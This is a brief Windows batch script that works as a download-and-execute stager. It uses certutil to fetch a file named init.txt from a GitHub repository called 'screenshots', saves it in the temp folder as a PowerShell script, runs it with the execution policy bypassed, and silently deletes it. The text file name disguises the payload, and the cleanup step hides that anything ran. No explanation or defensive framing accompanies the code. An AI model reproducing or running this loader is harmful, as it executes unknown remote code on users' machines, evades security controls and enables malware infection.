@echo off
set URL=https://raw.githubusercontent.com/cem324/screenshots/main/init.txt
set FILE=%TEMP%\init.ps1
certutil -urlcache -f -split %URL% %FILE%
powershell -ExecutionPolicy Bypass -File %FILE%
del %FILE% 2>nul